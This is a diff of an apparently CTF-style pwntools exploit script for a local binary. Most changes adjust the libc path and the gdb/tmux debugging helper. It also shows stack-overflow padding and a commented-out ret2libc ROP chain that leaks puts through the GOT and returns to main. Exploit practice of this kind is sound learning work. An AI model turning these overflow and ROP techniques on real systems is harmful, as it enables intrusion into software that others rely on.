@@ -23,7 +23,7 @@ got     = lambda data               :elf.got[data]
 sym     = lambda data               :libc.sym[data]
 itr     = lambda                    :p.interactive()
 
-local_libc  = './libc.so.6'
+local_libc  = '/home/cc/glibc-all-in-one/libs/2.32-0ubuntu3_amd64/libc-2.32.so'
 local_libc_32 = '/lib/i386-linux-gnu/libc.so.6'
 remote_libc = ''
 binary = './main'
@@ -40,9 +40,10 @@ libc=ELF(local_libc)
 # libc = ELF(remote_libc)
 
 def dbg(cmd=''):
-    os.system('tmux set mouse on')
-    context.terminal = ['tmux','splitw','-h']
-    gdb.attach(p,cmd)
+    # os.system('tmux set mouse on')
+    context.terminal = ['tmux', 'splitw', '-h', '-p', '63', '-F' '#{pane_pid}', '-P']
+
+    gdb.attach(proc.pidof(p)[0],cmd)
     pause()
 
 plt_puts=elf.plt['puts']
@@ -58,7 +59,8 @@ exp=b'a'*8*6
 exp+=p64(0xffff254320000000)
 # exp+=p64()
 # exp+=p64(pop_rdi_addr)+p64(got_puts)+p64(puts_addr)+p64(main_addr)
-gdb.attach(p,'b *0x0000000000401225')
+# gdb.attach(p,'b *0x0000000000401225')
+dbg('b *0x0000000000401225')
 pause()
 # p.sendline(exp)
 # p.recvuntil(b'Now got was clear!\n')
